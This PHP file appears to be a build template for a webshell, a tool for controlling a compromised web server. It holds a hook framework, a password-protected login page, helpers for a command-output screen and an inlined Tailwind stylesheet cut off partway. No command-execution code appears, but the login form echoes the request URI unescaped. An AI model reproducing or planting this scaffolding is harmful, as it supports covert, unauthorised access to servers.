<?php

// section.functions

/**
 * Hooks container
 */
$hooks = array(
    // Hooks that are called directly before any page is rendered, useful to enforce authentication and similar
    "page_generation" => array(),
    // Hooks that are called to add isolated operations, isolated operations are operations that must be run in an
    // isolated environment meaning no other content should be rendered on the page except the operation result.
    // Example: file download, redirects, etc.
    "isolated_ops"    => array(),
    // Hooks that are called to add register features to the webshell
    "features"        => array(),
    // Named hooks that are called to render a page, ONLY the first matching hook is called.
    // This is a named array (aka object) => [hook_name => function1, hook_name => function2, ...]
    "GET_page"        => array(),
    // Named hooks that are called to handle a POST request, ONLY the first matching hook is called.
    // This is a named array (aka object) => [hook_name => function1, hook_name => function2, ...]
    "POST_operation"  => array(),
);

/**
 * Register a hook
 *
 * @param $hook string The hook to register
 * @param $function string|array The function to call or call_user_func compatible array
 *
 * @return void
 */
function add_hook($hook, $function) {
    global $hooks;

    $hooks[$hook][] = $function;
}

/**
 * Register a named hook
 *
 * @param $hook string The hook to register
 * @param $name string The name of the hook
 * @param $function string|array The function to call or call_user_func compatible array
 *
 * @return void
 */
function add_named_hook($hook, $name, $function) {
    global $hooks;

    // If the hook is already registered any new registration is ignored
    if (!empty($hooks[$hook][$name])) {
        return;
    }

    $hooks[$hook][$name] = $function;
}

/**
 * Call a hook
 *
 * @param $hook string The hook to call
 * @param $arguments array The arguments to pass to the hook (by reference)
 *
 * @return void
 */
function call_hook($hook, &$arguments = array()) {
    global $hooks;

    foreach ($hooks[$hook] as $function) {
        call_user_func_array($function, $arguments);
    }
}

/**
 * Call a named hook
 *
 * @param $hook string The hook to call
 * @param $name string The name of the hook
 * @param $arguments array The arguments to pass to the hook (by reference)
 *
 * @return void
 */
function call_named_hook($hook, $name, &$arguments = array()) {
    global $hooks;

    // If the hook is not registered, fail silently
    if (empty($hooks[$hook][$name])) {
        return;
    }

    call_user_func_array($hooks[$hook][$name], $arguments);
}

// section.functions.end

// inject: section.constants
$LOGIN    = "__FEAT_LOGIN__";
$USERNAME = "__USERNAME__";
$PASSWORD = "__PASSWORD__";
$SALT     = '__SALT__';
// inject: file://./helpers.php
/**
 * Check if the request method is POST
 *
 * @return bool
 */
function __PREFIX__isPost() {
    return $_SERVER['REQUEST_METHOD'] === 'POST';
}

/**
 * Load the page or get the fallback page
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return mixed
 */
function __PREFIX__loadPageOrDefault($features) {
    return isset($_GET['page']) ? $_GET['page'] : $features[0]["op"];
}

/**
 * Render the page content by calling the named hook for the current page
 *
 * @param $page string The page to render
 *
 * @return void
 */
function __PREFIX__renderPage($page) {
    global $css;
    // Load the page content by calling the named hook for the current page
    $content = "";
    $args    = array(&$content, $page, $css);
    call_named_hook("GET_page", $page, $args);

    // Render the page content
    echo $content;
}

/**
 * Check if the operation is in the isolated operations list
 *
 * @param $operation string The operation to check
 * @param $isolated_ops array The isolated operations list
 *
 * @return bool
 */
function __PREFIX__isIsolatedOperation($operation, $isolated_ops) {
    return in_array($operation, $isolated_ops);
}

/**
 * Open the command output screen where output can be freely written
 *
 * @param string $classes Classes to apply to the command output screen
 * @param string $title Title of the command output screen
 * @param bool $no_margin Whether to remove the margin from the command output screen
 * @param bool $no_padding Whether to remove the padding from the command output screen
 *
 * @return void
 */
function __PREFIX__openCommandOutputScreen(
    $classes = "",
    $title = "Command output",
    $no_margin = false,
    $no_padding = false
) {
    ?>
    <div class="<?php
    echo $no_margin ? "" : "ml-72 ";
    echo $no_padding ? "" : "py-10 ";
    ?>">
    <div class="container px-16">
    <div class="bg-zinc-900 font-mono text-sm overflow-auto rounded shadow-md text-white px-6 py-3">
    <h3 class="border-b border-zinc-700 text-sm font-semibold leading-8">
        <?php echo $title ?>
    </h3>
    <pre class="p-2 mt-2 <?php echo $classes ?>"><?php
}

/**
 * Closes the command output screen
 *
 * @return void
 */
function __PREFIX__closeCommandOutputScreen() {
    ?></pre>
    </div>
    </div>
    </div>
    <?php
}

// inject: section.functions
/**
 * Create the login page
 */
function __PREFIX__makeLoginPage(&$page_content, $page, $css) {
    $username = !empty($_GET["username"]) ? htmlentities($_GET["username"]) : false;
    $error    = !empty($_GET["error"]) ? htmlentities($_GET["error"]) : false;

    ob_start();
    ?>
    <html lang="en" class="h-full bg-zinc-900">
    <head>
        <title>__TITLE__</title>
        <style><?php echo $css ?></style>
        <script>__JS__</script>
    </head>
    <body class="h-full">
    <div class="flex min-h-full flex-col justify-center px-6 py-12 lg:px-8">
        <div class="sm:mx-auto sm:w-full sm:max-w-sm">
            <h2 class="mt-10 text-center text-2xl font-bold leading-9 tracking-tight text-white">
                Sign in to your account
            </h2>
        </div>

        <?php if ($error): ?>
            <div class="mt-4 sm:mx-auto sm:w-full sm:max-w-sm">
                <div class="bg-red-700 p-3 rounded-md text-white text-center">
                    <?php echo $error ?>
                </div>
            </div>
        <?php endif; ?>

        <div class="mt-10 sm:mx-auto sm:w-full sm:max-w-sm">
            <form class="space-y-6" action="<?php echo $_SERVER["REQUEST_URI"]; ?>" method="post">
                <input type="hidden" name="__OPERATION__" value="<?php echo $page ?>"/>
                <div>
                    <label for="__PARAM_1__" class="block text-sm font-medium leading-6 text-white">
                        Username
                    </label>
                    <div class="mt-2">
                        <input id="__PARAM_1__" name="__PARAM_1__" type="text" autocomplete="__PARAM_1__" required
                               class="block w-full rounded-md border-0 bg-white/5 py-1.5 text-white shadow-sm ring-1
                               ring-inset ring-white/10 focus:ring-2 focus:ring-inset focus:ring-indigo-500 sm:text-sm
                               sm:leading-6"
                               placeholder="admin"
                            <?php if ($username) {
                                echo "value=\"$username\"";
                            } ?>
                        >
                    </div>
                </div>

                <div>
                    <div class="flex items-center justify-between">
                        <label for="__PARAM_2__" class="block text-sm font-medium leading-6 text-white">
                            Password
                        </label>
                    </div>
                    <div class="mt-2">
                        <input id="__PARAM_2__" name="__PARAM_2__" type="password" autocomplete="__PARAM_2__" required
                               class="block w-full rounded-md border-0 bg-white/5 py-1.5 text-white shadow-sm ring-1
                               ring-inset ring-white/10 focus:ring-2 focus:ring-inset focus:ring-indigo-500 sm:text-sm
                               sm:leading-6"
                               placeholder="&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;&bullet;"
                        >
                    </div>
                </div>

                <div>
                    <button type="submit"
                            class="flex w-full justify-center rounded-md bg-indigo-500 px-3 py-1.5 text-sm
                            font-semibold leading-6 text-white shadow-sm hover:bg-indigo-400 focus-visible:outline
                            focus-visible:outline-2 focus-visible:outline-offset-2 focus-visible:outline-indigo-500">
                        Sign in
                    </button>
                </div>
            </form>
        </div>
    </div>
    </body>
    </html>
    <?php
    $page_content = ob_get_clean();
}

/**
 * Handle the login operation
 *
 * @param $operation string The operation to handle
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *
 * @return void
 */
function __PREFIX__handleLogin($operation, $features) {
    global $SALT, $PASSWORD, $USERNAME;

    // loads the username and password from the POST request and hashes them
    $username = hash("sha512", $_POST["__PARAM_1__"] . $SALT);
    $password = hash("sha512", $_POST["__PARAM_2__"] . $SALT);

    // checks if the username and password are correct
    if ($username === $USERNAME && $password === $PASSWORD) {
        // if the username and password are correct, set the auth session variable to true
        $_SESSION["auth"] = true;

        // redirect the user to the second feature page
        header("Location: ?page=" . $features[1]["op"], true, 301);
        return;
    }

    // if the username and password are incorrect, redirect the user to the login page
    header(
        "Location: ?page=$operation&username=" . urlencode($_POST["__PARAM_1__"]) .
        "&error=" . urlencode("Invalid username or password"),
        true,
        301
    );
}

/**
 * Hook the page generation to check if the user is authenticated
 *
 * @return void
 */
function __PREFIX__login_hooks_page_generation() {
    global $LOGIN;

    // Check if the user is authenticated
    if ($_SESSION["auth"] !== true) {
        header("Location: ?page=" . $LOGIN);
        die();
    }

    // if the user is authenticated simply continues
}

/**
 * Hook the isolated operations to add the login operation
 *
 * @param $isolated_ops array The isolated operations container
 *
 * @return void
 */
function __PREFIX__login_hooks_isolated_ops(&$isolated_ops) {
    global $LOGIN;

    $isolated_ops[] = $LOGIN;
}

/**
 * Hook the features to add the login feature
 *
 * @param $features array{title: string, description: string, svg: string, hidden?: bool, op: string}[] The features
 *     container
 *
 * @return void
 */
function __PREFIX__login_hooks_features(&$features) {
    global $LOGIN;

    // Emplace the login feature at the beginning of the features array to make sure its picked as the fallback route if
    // none is defined
    array_unshift(
        $features,
        array(
            "name"        => "Login",
            "description" => "A simple login page",
            "hidden"      => true,
            "op"          => $LOGIN,
        )
    );
}

// inject: sections.hooks
session_start();
add_hook("page_generation", "__PREFIX__login_hooks_page_generation");
add_hook("isolated_ops", "__PREFIX__login_hooks_isolated_ops");
add_hook("features", "__PREFIX__login_hooks_features");
add_named_hook("GET_page", $LOGIN, "__PREFIX__makeLoginPage");
add_named_hook("POST_operation", $LOGIN, "__PREFIX__handleLogin");

// section.main
date_default_timezone_set("UTC");
$css = <<<CSS
/*! tailwindcss v3.4.3 | MIT License | https://tailwindcss.com*/*,:after,:before{box-sizing:border-box;border:0 solid #e5e7eb}:after,:before{--tw-content:""}:host,html{line-height:1.5;-webkit-text-size-adjust:100%;-moz-tab-size:4;-o-tab-size:4;tab-size:4;font-family:ui-sans-serif,system-ui,sans-serif,Apple Color Emoji,Segoe UI Emoji,Segoe UI Symbol,Noto Color Emoji;font-feature-settings:normal;font-variation-settings:normal;-webkit-tap-highlight-color:transparent}body{margin:0;line-height:inherit}hr{height:0;color:inherit;border-top-width:1px}abbr:where([title]){-webkit-text-decoration:underline dotted;text-decoration:underline dotted}h1,h2,h3,h4,h5,h6{font-size:inherit;font-weight:inherit}a{color:inherit;text-decoration:inherit}b,strong{font-weight:bolder}code,kbd,pre,samp{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace;font-feature-settings:normal;font-variation-settings:normal;font-size:1em}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:initial}sub{bottom:-.25em}sup{top:-.5em}table{text-indent:0;border-color:inherit;border-collapse:collapse}button,input,optgroup,select,textarea{font-family:inherit;font-feature-settings:inherit;font-variation-settings:inherit;font-size:100%;font-weight:inherit;line-height:inherit;letter-spacing:inherit;color:inherit;margin:0;padding:0}button,select{text-transform:none}button,input:where([type=button]),input:where([type=reset]),input:where([type=submit]){-webkit-appearance:button;background-color:initial;background-image:none}:-moz-focusring{outline:auto}:-moz-ui-invalid{box-shadow:none}progress{vertical-align:initial}::-webkit-inner-spin-button,::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}summary{display:list-item}blockquote,dd,dl,figure,h1,h2,h3,h4,h5,h6,hr,p,pre{margin:0}fieldset{margin:0}fieldset,legend{padding:0}menu,ol,ul{list-style:none;margin:0;padding:0}dialog{padding:0}textarea{resize:vertical}input::-moz-placeholder,textarea::-moz-placeholder{opacity:1;color:#9ca3af}input::placeholder,textarea::placeholder{opacity:1;color:#9ca3af}[role=button],button{cursor:pointer}:disabled{cursor:default}audio,canvas,embed,iframe,img,object,svg,video{display:block;vertical-align:middle}img,video{max-width:100%;height:auto}[hidden]{display:none}[multiple],[type=date],[type=datetime-local],[type=email],[type=month],[type=number],[type=password],[type=search],[type=tel],[type=text],[type=time],[type=url],[type=week],input:where(:not([type])),select,textarea{-webkit-appearance:none;-moz-appearance:none;appearance:none;background-color:#fff;border-color:#6b7280;border-width:1px;border-radius:0;padding:.5rem .75rem;font-size:1rem;line-height:1.5rem;--tw-shadow:0 0 #0000}[multiple]:focus,[type=date]:focus,[type=datetime-local]:focus,[type=email]:focus,[type=month]:focus,[type=number]:focus,[type=password]:focus,[type=search]:focus,[type=tel]:focus,[type=text]:focus,[type=time]:focus,[type=url]:focus,[type=week]:focus,input:where(:not([type])):focus,select:focus,textarea:focus{outline:2px solid #0000;outline-offset:2px;--tw-ring-inset:var(--tw-empty,/*!*/ /*!*/);--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:#2563eb;--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow);border-color:#2563eb}input::-moz-placeholder,textarea::-moz-placeholder{color:#6b7280;opacity:1}input::placeholder,textarea::placeholder{color:#6b7280;opacity:1}::-webkit-datetime-edit-fields-wrapper{padding:0}::-webkit-date-and-time-value{min-height:1.5em;text-align:inherit}::-webkit-datetime-edit{display:inline-flex}::-webkit-datetime-edit,::-webkit-datetime-edit-day-field,::-webkit-datetime-edit-hour-field,::-webkit-datetime-edit-meridiem-field,::-webkit-datetime-edit-millisecond-field,::-webkit-datetime-edit-minute-field,::-webkit-datetime-edit-month-field,::-webkit-datetime-edit-second-field,::-webkit-datetime-edit-year-field{padding-top:0;padding-bottom:0}select{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 20 20'%3E%3Cpath stroke='%236b7280' stroke-linecap='round' stroke-linejoin='round' stroke-width='1.5' d='m6 8 4 4 4-4'/%3E%3C/svg%3E");background-position:right .5rem center;background-repeat:no-repeat;background-size:1.5em 1.5em;padding-right:2.5rem;-webkit-print-color-adjust:exact;print-color-adjust:exact}[multiple],[size]:where(select:not([size="1"])){background-image:none;background-position:0 0;background-repeat:unset;background-size:initial;padding-right:.75rem;-webkit-print-color-adjust:unset;print-color-adjust:unset}[type=checkbox],[type=radio]{-webkit-appearance:none;-moz-appearance:none;appearance:none;padding:0;-webkit-print-color-adjust:exact;print-color-adjust:exact;display:inline-block;vertical-align:middle;background-origin:border-box;-webkit-user-select:none;-moz-user-select:none;user-select:none;flex-shrink:0;height:1rem;width:1rem;color:#2563eb;background-color:#fff;border-color:#6b7280;border-width:1px;--tw-shadow:0 0 #0000}[type=checkbox]{border-radius:0}[type=radio]{border-radius:100%}[type=checkbox]:focus,[type=radio]:focus{outline:2px solid #0000;outline-offset:2px;--tw-ring-inset:var(--tw-empty,/*!*/ /*!*/);--tw-ring-offset-width:2px;--tw-ring-offset-color:#fff;--tw-ring-color:#2563eb;--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow)}[type=checkbox]:checked,[type=radio]:checked{border-color:#0000;background-color:currentColor;background-size:100% 100%;background-position:50%;background-repeat:no-repeat}[type=checkbox]:checked{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' viewBox='0 0 16 16'%3E%3Cpath d='M12.207 4.793a1 1 0 0 1 0 1.414l-5 5a1 1 0 0 1-1.414 0l-2-2a1 1 0 0 1 1.414-1.414L6.5 9.086l4.293-4.293a1 1 0 0 1 1.414 0z'/%3E%3C/svg%3E")}@media (forced-colors:active) {[type=checkbox]:checked{-webkit-appearance:auto;-moz-appearance:auto;appearance:auto}}[type=radio]:checked{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='%23fff' viewBox='0 0 16 16'%3E%3Ccircle cx='8' cy='8' r='3'/%3E%3C/svg%3E")}@media (forced-colors:active) {[type=radio]:checked{-webkit-appearance:auto;-moz-appearance:auto;appearance:auto}}[type=checkbox]:checked:focus,[type=checkbox]:checked:hover,[type=checkbox]:indeterminate,[type=radio]:checked:focus,[type=radio]:checked:hover{border-color:#0000;background-color:currentColor}[type=checkbox]:indeterminate{background-image:url("data:image/svg+xml;charset=utf-8,%3Csvg xmlns='http://www.w3.org/2000/svg' fill='none' viewBox='0 0 16 16'%3E%3Cpath stroke='%23fff' stroke-linecap='round' stroke-linejoin='round' stroke-width='2' d='M4 8h8'/%3E%3C/svg%3E");background-size:100% 100%;background-position:50%;background-repeat:no-repeat}@media (forced-colors:active) {[type=checkbox]:indeterminate{-webkit-appearance:auto;-moz-appearance:auto;appearance:auto}}[type=checkbox]:indeterminate:focus,[type=checkbox]:indeterminate:hover{border-color:#0000;background-color:currentColor}[type=file]{background:unset;border-color:inherit;border-width:0;border-radius:0;padding:0;font-size:unset;line-height:inherit}[type=file]:focus{outline:1px solid ButtonText;outline:1px auto -webkit-focus-ring-color}::-webkit-scrollbar{width:.5rem}::-webkit-scrollbar-track{border-radius:.5rem;--tw-bg-opacity:1;background-color:rgb(228 228 231/var(--tw-bg-opacity))}@media (prefers-color-scheme:dark){::-webkit-scrollbar-track{--tw-bg-opacity:1;background-color:rgb(39 39 42/var(--tw-bg-opacity))}}::-webkit-scrollbar-thumb{border-radius:.5rem;--tw-bg-opacity:1;background-color:rgb(161 161 170/var(--tw-bg-opacity))}@media (prefers-color-scheme:dark){::-webkit-scrollbar-thumb{--tw-bg-opacity:1;background-color:rgb(63 63 70/var(--tw-bg-opacity))}}::-webkit-scrollbar-thumb:hover{--tw-bg-opacity:1;background-color:rgb(113 113 122/var(--tw-bg-opacity))}@media (prefers-color-scheme:dark){::-webkit-scrollbar-thumb:hover{--tw-bg-opacity:1;background-color:rgb(82 82 91/var(--tw-bg-opacity))}}a{text-decoration:none!important}*,::backdrop,:after,:before{--tw-border-spacing-x:0;--tw-border-spacing-y:0;--tw-translate-x:0;--tw-translate-y:0;--tw-rotate:0;--tw-skew-x:0;--tw-skew-y:0;--tw-scale-x:1;--tw-scale-y:1;--tw-pan-x: ;--tw-pan-y: ;--tw-pinch-zoom: ;--tw-scroll-snap-strictness:proximity;--tw-gradient-from-position: ;--tw-gradient-via-position: ;--tw-gradient-to-position: ;--tw-ordinal: ;--tw-slashed-zero: ;--tw-numeric-figure: ;--tw-numeric-spacing: ;--tw-numeric-fraction: ;--tw-ring-inset: ;--tw-ring-offset-width:0px;--tw-ring-offset-color:#fff;--tw-ring-color:#3b82f680;--tw-ring-offset-shadow:0 0 #0000;--tw-ring-shadow:0 0 #0000;--tw-shadow:0 0 #0000;--tw-shadow-colored:0 0 #0000;--tw-blur: ;--tw-brightness: ;--tw-contrast: ;--tw-grayscale: ;--tw-hue-rotate: ;--tw-invert: ;--tw-saturate: ;--tw-sepia: ;--tw-drop-shadow: ;--tw-backdrop-blur: ;--tw-backdrop-brightness: ;--tw-backdrop-contrast: ;--tw-backdrop-grayscale: ;--tw-backdrop-hue-rotate: ;--tw-backdrop-invert: ;--tw-backdrop-opacity: ;--tw-backdrop-saturate: ;--tw-backdrop-sepia: ;--tw-contain-size: ;--tw-contain-layout: ;--tw-contain-paint: ;--tw-contain-style: }.container{width:100%}@media (min-width:640px){.container{max-width:640px}}@media (min-width:768px){.container{max-width:768px}}@media (min-width:1024px){.container{max-width:1024px}}@media (min-width:1280px){.container{max-width:1280px}}@media (min-width:1536px){.container{max-width:1536px}}.sr-only{position:absolute;width:1px;height:1px;padding:0;margin:-1px;overflow:hidden;clip:rect(0,0,0,0);white-space:nowrap;border-width:0}.visible{visibility:visible}.fixed{position:fixed}.relative{position:relative}.inset-y-0{top:0;bottom:0}.z-50{z-index:50}.-mx-2{margin-left:-.5rem;margin-right:-.5rem}.-mx-4{margin-left:-1rem;margin-right:-1rem}.-my-2{margin-top:-.5rem;margin-bottom:-.5rem}.mx-1{margin-left:.25rem;margin-right:.25rem}.mx-auto{margin-left:auto;margin-right:auto}.mb-0{margin-bottom:0}.mb-8{margin-bottom:2rem}.ml-3{margin-left:.75rem}.ml-72{margin-left:18rem}.ml-auto{margin-left:auto}.mr-1{margin-right:.25rem}.mr-1\.5{margin-right:.375rem}.mt-1{margin-top:.25rem}.mt-10{margin-top:2.5rem}.mt-2{margin-top:.5rem}.mt-4{margin-top:1rem}.mt-8{margin-top:2rem}.block{display:block}.inline-block{display:inline-block}.flex{display:flex}.table{display:table}.flow-root{display:flow-root}.grid{display:grid}.contents{display:contents}.hidden{display:none}.h-16{height:4rem}.h-4{height:1rem}.h-5{height:1.25rem}.h-6{height:1.5rem}.h-8{height:2rem}.h-full{height:100%}.max-h-96{max-height:24rem}.min-h-full{min-height:100%}.w-4{width:1rem}.w-5{width:1.25rem}.w-6{width:1.5rem}.w-72{width:18rem}.w-8{width:2rem}.w-full{width:100%}.w-1\/3{width:33.333333%}.min-w-0{min-width:0}.min-w-full{min-width:100%}.max-w-full{max-width:100%}.max-w-xl{max-width:36rem}.flex-1{flex:1 1 0%}.flex-shrink-0,.shrink-0{flex-shrink:0}.flex-grow{flex-grow:1}.flex-grow-0{flex-grow:0}.cursor-pointer{cursor:pointer}.select-none{-webkit-user-select:none;-moz-user-select:none;user-select:none}.select-all{-webkit-user-select:all;-moz-user-select:all;user-select:all}.list-inside{list-style-position:inside}.list-disc{list-style-type:disc}.grid-cols-2{grid-template-columns:repeat(2,minmax(0,1fr))}.flex-col{flex-direction:column}.items-start{align-items:flex-start}.items-center{align-items:center}.justify-center{justify-content:center}.justify-between{justify-content:space-between}.gap-8{gap:2rem}.gap-x-3{-moz-column-gap:.75rem;column-gap:.75rem}.gap-x-4{-moz-column-gap:1rem;column-gap:1rem}.gap-y-2{row-gap:.5rem}.gap-y-5{row-gap:1.25rem}.gap-y-6{row-gap:1.5rem}.gap-y-7{row-gap:1.75rem}.space-y-6>:not([hidden])~:not([hidden]){--tw-space-y-reverse:0;margin-top:calc(1.5rem*(1 - var(--tw-space-y-reverse)));margin-bottom:calc(1.5rem*var(--tw-space-y-reverse))}.divide-y>:not([hidden])~:not([hidden]){--tw-divide-y-reverse:0;border-top-width:calc(1px*(1 - var(--tw-divide-y-reverse)));border-bottom-width:calc(1px*var(--tw-divide-y-reverse))}.divide-gray-200>:not([hidden])~:not([hidden]){--tw-divide-opacity:1;border-color:rgb(229 231 235/var(--tw-divide-opacity))}.divide-gray-300>:not([hidden])~:not([hidden]){--tw-divide-opacity:1;border-color:rgb(209 213 219/var(--tw-divide-opacity))}.overflow-auto{overflow:auto}.overflow-hidden{overflow:hidden}.overflow-x-auto{overflow-x:auto}.overflow-y-auto{overflow-y:auto}.overflow-y-scroll{overflow-y:scroll}.whitespace-nowrap{white-space:nowrap}.rounded{border-radius:.25rem}.rounded-md{border-radius:.375rem}.border-0{border-width:0}.border-b{border-bottom-width:1px}.border-l-4{border-left-width:4px}.border-yellow-500{--tw-border-opacity:1;border-color:rgb(234 179 8/var(--tw-border-opacity))}.border-zinc-300{--tw-border-opacity:1;border-color:rgb(212 212 216/var(--tw-border-opacity))}.border-zinc-700{--tw-border-opacity:1;border-color:rgb(63 63 70/var(--tw-border-opacity))}.bg-gray-50{--tw-bg-opacity:1;background-color:rgb(249 250 251/var(--tw-bg-opacity))}.bg-indigo-500{--tw-bg-opacity:1;background-color:rgb(99 102 241/var(--tw-bg-opacity))}.bg-indigo-600{--tw-bg-opacity:1;background-color:rgb(79 70 229/var(--tw-bg-opacity))}.bg-white{--tw-bg-opacity:1;background-color:rgb(255 255 255/var(--tw-bg-opacity))}.bg-white\/5{background-color:#ffffff0d}.bg-yellow-100{--tw-bg-opacity:1;background-color:rgb(254 249 195/var(--tw-bg-opacity))}.bg-zinc-100{--tw-bg-opacity:1;background-color:rgb(244 244 245/var(--tw-bg-opacity))}.bg-zinc-800{--tw-bg-opacity:1;background-color:rgb(39 39 42/var(--tw-bg-opacity))}.bg-zinc-900{--tw-bg-opacity:1;background-color:rgb(24 24 27/var(--tw-bg-opacity))}.p-2{padding:.5rem}.p-4{padding:1rem}.px-16{padding-left:4rem;padding-right:4rem}.px-2{padding-left:.5rem;padding-right:.5rem}.px-3{padding-left:.75rem;padding-right:.75rem}.px-4{padding-left:1rem;padding-right:1rem}.px-6{padding-left:1.5rem;padding-right:1.5rem}.py-1{padding-top:.25rem;padding-bottom:.25rem}.py-1\.5{padding-top:.375rem;padding-bottom:.375rem}.py-10{padding-top:2.5rem;padding-bottom:2.5rem}.py-12{padding-top:3rem;padding-bottom:3rem}.py-2{padding-top:.5rem;padding-bottom:.5rem}.py-3{padding-top:.75rem;padding-bottom:.75rem}.py-3\.5{padding-top:.875rem;padding-bottom:.875rem}.py-4{padding-top:1rem}.pb-4,.py-4{padding-bottom:1rem}.pl-3{padding-left:.75rem}.pr-10{padding-right:2.5rem}.pr-4{padding-right:1rem}.text-left{text-align:left}.text-center{text-align:center}.text-right{text-align:right}.align-middle{vertical-align:middle}.font-mono{font-family:ui-monospace,SFMono-Regular,Menlo,Monaco,Consolas,Liberation Mono,Courier New,monospace}.text-2xl{font-size:1.5rem;line-height:2rem}.text-base{font-size:1rem;line-height:1.5rem}.text-sm{font-size:.875rem;line-height:1.25rem}.text-lg{font-size:1.125rem;line-height:1.75rem}.font-bold{font-weight:700}.font-medium{font-weight:500}.font-semibold{font-weight:600}.leading-6{line-height:1.5rem}.leading-7{line-height:1.75rem}.leading-8{line-height:2rem}.leading-9{line-height:2.25rem}.tracking-tight{letter-spacing:-.025em}.text-gray-500{--tw-text-opacity:1;color:rgb(107 114 128/var(--tw-text-opacity))}.text-gray-700{--tw-text-opacity:1;color:rgb(55 65 81/var(--tw-text-opacity))}.text-gray-900{--tw-text-opacity:1;color:rgb(17 24 39/var(--tw-text-opacity))}.text-indigo-600{--tw-text-opacity:1;color:rgb(79 70 229/var(--tw-text-opacity))}.text-red-500{--tw-text-opacity:1;color:rgb(239 68 68/var(--tw-text-opacity))}.text-white{--tw-text-opacity:1;color:rgb(255 255 255/var(--tw-text-opacity))}.text-yellow-600{--tw-text-opacity:1;color:rgb(202 138 4/var(--tw-text-opacity))}.text-zinc-400{--tw-text-opacity:1;color:rgb(161 161 170/var(--tw-text-opacity))}.text-zinc-500{--tw-text-opacity:1;color:rgb(113 113 122/var(--tw-text-opacity))}.text-zinc-900{--tw-text-opacity:1;color:rgb(24 24 27/var(--tw-text-opacity))}.text-zinc-800{--tw-text-opacity:1;color:rgb(39 39 42/var(--tw-text-opacity))}.placeholder-zinc-400::-moz-placeholder{--tw-placeholder-opacity:1;color:rgb(161 161 170/var(--tw-placeholder-opacity))}.placeholder-zinc-400::placeholder{--tw-placeholder-opacity:1;color:rgb(161 161 170/var(--tw-placeholder-opacity))}.shadow{--tw-shadow:0 1px 3px 0 #0000001a,0 1px 2px -1px #0000001a;--tw-shadow-colored:0 1px 3px 0 var(--tw-shadow-color),0 1px 2px -1px var(--tw-shadow-color)}.shadow,.shadow-md{box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.shadow-md{--tw-shadow:0 4px 6px -1px #0000001a,0 2px 4px -2px #0000001a;--tw-shadow-colored:0 4px 6px -1px var(--tw-shadow-color),0 2px 4px -2px var(--tw-shadow-color)}.shadow-sm{--tw-shadow:0 1px 2px 0 #0000000d;--tw-shadow-colored:0 1px 2px 0 var(--tw-shadow-color);box-shadow:var(--tw-ring-offset-shadow,0 0 #0000),var(--tw-ring-shadow,0 0 #0000),var(--tw-shadow)}.ring-1{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(1px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow,0 0 #0000)}.ring-inset{--tw-ring-inset:inset}.ring-black{--tw-ring-opacity:1;--tw-ring-color:rgb(0 0 0/var(--tw-ring-opacity))}.ring-gray-300{--tw-ring-opacity:1;--tw-ring-color:rgb(209 213 219/var(--tw-ring-opacity))}.ring-white\/10{--tw-ring-color:#ffffff1a}.ring-zinc-300{--tw-ring-opacity:1;--tw-ring-color:rgb(212 212 216/var(--tw-ring-opacity))}.ring-opacity-5{--tw-ring-opacity:0.05}.transition-all{transition-property:all;transition-timing-function:cubic-bezier(.4,0,.2,1);transition-duration:.15s}.duration-300{transition-duration:.3s}.hover\:bg-indigo-400:hover{--tw-bg-opacity:1;background-color:rgb(129 140 248/var(--tw-bg-opacity))}.hover\:bg-indigo-500:hover{--tw-bg-opacity:1;background-color:rgb(99 102 241/var(--tw-bg-opacity))}.hover\:bg-zinc-700:hover{--tw-bg-opacity:1;background-color:rgb(63 63 70/var(--tw-bg-opacity))}.hover\:text-indigo-900:hover{--tw-text-opacity:1;color:rgb(49 46 129/var(--tw-text-opacity))}.hover\:text-zinc-700:hover{--tw-text-opacity:1;color:rgb(63 63 70/var(--tw-text-opacity))}.focus\:ring-2:focus{--tw-ring-offset-shadow:var(--tw-ring-inset) 0 0 0 var(--tw-ring-offset-width) var(--tw-ring-offset-color);--tw-ring-shadow:var(--tw-ring-inset) 0 0 0 calc(2px + var(--tw-ring-offset-width)) var(--tw-ring-color);box-shadow:var(--tw-ring-offset-shadow),var(--tw-ring-shadow),var(--tw-shadow,0 0 #0000)}.focus\:ring-inset:focus{--tw-ring-inset:inset}.focus\:ring-indigo-500:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(99 102 241/var(--tw-ring-opacity))}.focus\:ring-indigo-600:focus{--tw-ring-opacity:1;--tw-ring-color:rgb(79 70 